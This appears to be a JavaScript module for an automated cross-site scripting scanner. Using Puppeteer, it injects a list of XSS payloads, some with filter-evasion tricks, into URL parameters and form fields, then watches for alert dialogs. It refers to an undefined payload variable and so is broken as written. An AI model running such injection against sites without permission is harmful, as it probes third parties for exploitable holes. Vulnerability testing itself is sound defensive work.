const queryString = require('query-string');
const puppeteer = require('puppeteer');

const malscript=[
    '<script>alert("XSS")</script>',
    '<scr<script>ipt>alert("XSS")</scr<script>ipt>',
    '"><script>alert("XSS")</script>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=alert("XSS");>',
    '<img src=x onerror=alert(String.fromCharCode(88,83,83));>',
    '<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>',
    '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
    '"><img src=x onerror=alert("XSS");>',
    '"><img src=x onerror=alert(String.fromCharCode(88,83,83));>',
]

async function check_xss(url) {
    const browser = await puppeteer.launch({
      headless: false,
      defaultViewport: null,
      args: ['--start-maximized'],
    });

    const page = await browser.newPage();
    await page.goto(url, { waitUntil: 'networkidle2' });
    const formsArray = await page.$$('form');
    const page2 = await browser.newPage();
    let isVulnerable = false;

    page2.on('dialog', async (dialog) => {
      isVulnerable = true;
      dialog.accept();

    });

    for (script in MALICIOUS_SCRIPT) {
      let newUrl = check_url(url, MALICIOUS_SCRIPT[script]);
  
      if (newUrl != '') {
        await page2.goto(newUrl);
      }
  
      if (isVulnerable) {
        browser.close();
        return true;
      }
  
      for (i in formsArray) {
        try {
          await page2.goto(url, { waitUntil: 'networkidle2', timeout: 60000 });
          let inputsArray = await formsArray[
            i
          ].$$eval(
            'input[type="text"],input[type="search"],input:not([type]),textarea',
            (inputs) =>
              inputs.map((input) =>
                input.id ? '#' + input.id : '.' + input.className
              )
          );
  
          for (input in inputsArray) {
            let selector = inputsArray[input];
            if (selector.charAt(0) == '.') {
              selector = selector.split(' ');
            }
            await page2.type(selector, MALICIOUS_SCRIPT[script], { delay: 20 });
          }
  
          let btnsArray = await formsArray[i]
          .$$eval('input[type="submit"],button[type="submit"]', (subs) =>
            subs.map((sub) => (sub.id ? '#' + sub.id : '.' + sub.className))
          );

          let btn = btnsArray[0].split(' ');
          await page2.click(btn);
          newUrl = check_url(page2.url(), MALICIOUS_SCRIPT[script]);
        
          if (newUrl != '') {
            await page2.goto(newUrl);
          }
        } 
        catch (error) {
          browser.close();
          return error.message;
        }
      }

      await new Promise((resolve) => setTimeout(resolve, 2000));
      if (isVulnerable) {
        browser.close();
        return true;
      }
    }
    
    browser.close();
    await new Promise((resolve) => setTimeout(resolve, 2000));
    if (!isVulnerable) {
      return false;
    } else {
      return true;
    }
  }
  
  const check_url = (url, script) => {
    let temp = {};
    let newUrl = '';
    temp = url.split('?');
    let tmp = queryString.parse(temp[1]);
    let key = Object.keys(tmp);
    if (temp[1]) {
      newUrl = temp[0] + '?';
      for (let k in tmp) {
        if (key[0] === k) {
          newUrl = newUrl + k + '=' + script;
        } else {
          newUrl = newUrl + '&' + k + '=' + script;
        }
      }
    }
    return newUrl;
  };
  
  module.exports={check_xss,check_url}